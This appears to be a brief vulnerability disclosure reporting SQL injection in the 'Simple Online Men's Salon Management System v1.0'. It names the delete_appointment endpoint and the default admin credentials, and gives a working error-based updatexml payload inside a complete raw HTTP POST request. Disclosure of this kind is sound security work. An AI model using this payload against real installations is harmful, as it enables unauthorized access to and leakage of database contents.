# Simple Online Men's Salon Management System v1.0 by Sourcecodester has SQL injection

Bug_author: Liu Lanling

vendors: https://www.sourcecodester.com/php/15069/simple-online-mens-salon-management-system-php-free-source-code.html

Login account:admin/admin123

Vulnerability File: /msms/classes/Master.php?f=delete_appointment

Vulnerability location: /msms/classes/Master.php?f=delete_appointment, id

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /msms/classes/Master.php?f=delete_appointment HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/msms/admin/?page=appointments
Content-Length: 54
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close

id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)# // Leak place ---> id
```

<img width="1591" height="349" alt="image" src="https://github.com/user-attachments/assets/a8aa9fd0-911f-46e5-84e7-d6bcb125ab0e" />
